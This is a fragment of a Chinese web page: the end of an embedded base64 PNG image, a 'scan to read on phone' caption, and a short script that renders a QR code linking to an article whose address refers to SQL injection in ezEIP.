PQOcezMzvcnD4F4g0kOcecD29iQXj4U8NOky/fgdGL860XYqbl0ZjptdecEeMGd29UYLw7m39tUY3AM7p565ySuD/dEe8cKxJ71iOK+pLvRrJAf3Atev3z/e7OP6knVzIb9fPP3VSV6nyjletORh2F+97oG9Buu4z8kMMbgnHmlniKczeAbQSyMHtm+0wNAS5HrJK6fWuXqAbXbVeny9If2OvDgf39TB24PHuZ+9Ph2pReu59GidVROqrlyommLYz6t8BbBH/cHKJy31FasupKa4A3ytritPH9gDZtWC6w3JnXgTHgvJ9h7hs7ODNw4MC3D4ugnOYf9hL9ccTX8QpFf8B22nVtjPB8c4TWA9eWWdQ6haYnCf6hWpi8dClFx4/R2YFgLeIsx8dtxs+6xe9XjFVa8xzNcGa/GBc5g5nrCuJSSvLF2IpjiI1nlVh/kcwKF11SdDdPG0EBkuvO4OXAt53b1fXvlbF6JXLgAO38yjr04B9t7yrPqkpaey9HuIPz7wGWDn7une5OJ4O6sWgGfDOX/rQnLhi5+/A9+yEJg3niPliQF7ooth1qQH6V1xPOAZsHOvJb/Ft67R++Lt+r38kb5vWci9g1z1x+/AtJBsccVnY+Ot9WjgJ7fnsP9gWPvuxXCcl7ni3itN6Lpy8BzFAhxzaR1w39N7dP0A3J98xdNC+sAr/907MBYC3h7c57Mj1o2D53TvI570gGfAzqmtuM5WDO675YWjB5zDzr0fXNM1gu5Z5Wde8Dzg+hfDjzf7GG/Im53rP3uc/wEAAP//+Dp6QAAAAAZJREFUAwA4OF2YWEQ3ZwAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ezEIP-shop-productlist-svids-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 